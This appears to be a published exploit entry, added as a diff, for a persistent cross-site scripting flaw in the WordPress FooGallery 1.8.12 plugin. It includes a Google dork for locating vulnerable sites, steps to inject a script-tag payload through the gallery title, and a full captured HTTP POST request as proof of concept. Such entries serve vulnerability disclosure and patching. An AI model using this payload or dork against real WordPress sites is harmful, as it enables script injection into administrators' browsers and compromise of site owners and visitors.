@@ -1,0 +1,44 @@
+# Exploit Title: Wordpress FooGallery 1.8.12 - Persistent Cross-Site Scripting
+# Google Dork: inurl:"\wp-content\plugins\foogallery"
+# Date: 2019-06-13
+# Exploit Author: Unk9vvN
+# Vendor Homepage: https://foo.gallery/
+# Software Link: https://wordpress.org/plugins/foogallery/
+# Version: 1.8.12
+# Tested on: Kali Linux
+# CVE: N/A
+
+
+# Description
+# This vulnerability is in the validation mode and is located in the plugin settings panel and the vulnerability type is stored ,it happend becuse in setting is an select tag ,this select tag have option with value of title gallerys so simply we just have to break option and write our script tag
+the vulnerability parameters are as follows.
+
+1.Go to the 'add Gallery' of FooGallery
+2.Enter the payload in the "add Title"
+3.Click the "Publish" option
+4.Go to plugin setting of FooGallery
+5.Your payload will run
+
+
+# URI: http://localhost/wordpress/wp-admin/post-new.php?post_type=foogallery&wp-post-new-reload=true
+# Parameter & Payoad: post_title="/><script>alert("Unk9vvn")</script>
+
+
+#
+# POC
+#
+POST /wordpress/wp-admin/post.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/wordpress/wp-admin/post-new.php?post_type=foogallery&wp-post-new-reload=true
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 2694
+Cookie: ......
+Connection: close
+Upgrade-Insecure-Requests: 1
+DNT: 1
+
+_wpnonce=933471aa43&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fpost-new.php%3Fpost_type%3Dfoogallery&user_ID=1&action=editpost&originalaction=editpost&post_author=1&post_type=foogallery&original_post_status=auto-draft&referredby=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2Fedit.php%3Fpost_type%3Dfoogallery%26ids%3D31&_wp_original_http_referer=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2Fedit.php%3Fpost_type%3Dfoogallery%26ids%3D31&auto_draft=&post_ID=32&meta-box-order-nonce=5e054a06d1&closedpostboxesnonce=03e898cf80&post_title=%22%2F%3E%3Cscript%3Ealert%28%22Unk9vvn%22%29%3C%2Fscript%3E&samplepermalinknonce=fc4f7ec2ab&hidden_post_status=draft&post_status=draft&hidden_post_password=&hidden_post_visibility=public&visibility=public&post_password=&mm=09&jj=13&aa=2019&hh=14&mn=42&ss=45&hidden_mm=09&cur_mm=09&hidden_jj=13&cur_jj=13&hidden_aa=2019&cur_aa=2019&hidden_hh=14&cur_hh=14&hidden_mn=42&cur_mn=42&original_publish=Publish&publish=Publish&foogallery_sort=&foogallery_clear_gallery_thumb_cache_nonce=e18d32a542&_thumbnail_id=-1&_foogallery_settings%5Bfoogallery_items_view%5D=manage&foogallery_nonce=b6066e6407&foogallery_attachments=&foogallery_preview=e35a011572&foogallery_template=default&_foogallery_settings%5Bdefault_thumbnail_dimensions%5D%5Bwidth%5D=150&_foogallery_settings%5Bdefault_thumbnail_dimensions%5D%5Bheight%5D=150&_foogallery_settings%5Bdefault_thumbnail_link%5D=image&_foogallery_settings%5Bdefault_lightbox%5D=none&_foogallery_settings%5Bdefault_spacing%5D=fg-gutter-10&_foogallery_settings%5Bdefault_alignment%5D=fg-center&_foogallery_settings%5Bdefault_theme%5D=fg-light&_foogallery_settings%5Bdefault_border_size%5D=fg-border-thin&_foogallery_settings%5Bdefault_rounded_corners%5D=&_foogallery_settings%5Bdefault_drop_shadow%5D=fg-shadow-outline&_foogallery_settings%5Bdefault_inner_shadow%5D=&_foogallery_settings%5Bdefault_loading_icon%5D=fg-loading-default&_foogallery_settings%5Bdefault_loaded_effect%5D=fg-loaded-fade-in&_foogallery_settings%5Bdefault_hover_effect_color%5D=&_foogallery_settings%5Bdefault_hover_effect_scale%5D=&_foogallery_settings%5Bdefault_hover_effect_caption_visibility%5D=fg-caption-hover&_foogallery_settings%5Bdefault_hover_effect_transition%5D=fg-hover-fade&_foogallery_settings%5Bdefault_hover_effect_icon%5D=fg-hover-zoom&_foogallery_settings%5Bdefault_caption_title_source%5D=&_foogallery_settings%5Bdefault_caption_desc_source%5D=&_foogallery_settings%5Bdefault_captions_limit_length%5D=&_foogallery_settings%5Bdefault_paging_type%5D=&_foogallery_settings%5Bdefault_custom_settings%5D=&_foogallery_settings%5Bdefault_custom_attributes%5D=&_foogallery_settings%5Bdefault_lazyload%5D=&post_name=&foogallery_custom_css=
